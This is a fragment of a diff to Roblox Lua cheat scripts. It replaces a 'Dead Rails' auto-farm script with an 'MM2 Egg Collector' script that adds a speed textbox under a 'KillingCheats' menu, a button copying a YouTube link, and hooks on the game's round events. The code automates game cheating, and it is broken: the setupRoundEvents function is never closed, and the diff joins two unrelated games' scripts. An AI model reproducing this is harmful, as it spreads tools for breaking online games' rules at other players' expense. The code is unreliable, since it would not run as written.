-            end
-        end)
+-- Textbox for changing the speed
+KillingCheats:CreateTextbox("Speed (sec)", function(text)
+    local newSpeed = tonumber(text)
+    if newSpeed then
+        TWEEN_SPEED = newSpeed
+        print("Speed set to: " .. TWEEN_SPEED)
+    else
+        print("Invalid speed value!")
     end
-end
+end)
 
--- Initialize functions
-SetupInstantInteract()
-SetupInstantMoneyCollection()
-SetupAutoTrainDriving()
+-- Button to copy YouTube URL
+YouTubeSection:CreateButton("Copy YT URL", function()
+    setclipboard("https://youtube.com/@amreeeshi?si=czc5I5omFqiWzGDe")
+    print("YouTube URL copied to clipboard!")
+end)
 
--- Show notification to user
-Rayfield:Notify({
-   Title = "Script Loaded",
-   Content = "khen.cc | Dead Rails has been loaded successfully!",
-   Duration = 3,
-   Image = nil,
-})
+-- Connect to round-related events
+local function setupRoundEvents()
+    -- Connect to round start event
+    local remotes = ReplicatedStorage:WaitForChild("Remotes")
+    local gameplay = remotes:WaitForChild("Gameplay")
+    
+    local roundStart = gameplay:WaitForChild("RoundStart")
+    roundStart.OnClientEvent:Connect(onNewRound)
+    
+    -- Connect to round end fade event
+    local roundEndFade = gameplay:WaitForChild("RoundEndFade")
+    roundEndFade.OnClientEvent:Connect(onRoundEnd)
+    
+    -- Connect to regular round end event as backup
+    local roundEnd = gameplay:FindFirstChild("RoundEnd")
+    if roundEnd then
+        roundEnd.OnClientEvent:Connect(onRoundEnd)
+    end
+    
+    
+-- Setup all our event handlers
+setupBagFullDetection()
+setupRoundEvents()
+
+print("MM2 Egg Collector script loaded! Original by Amare Scripts, Modified by Extra_Blox")
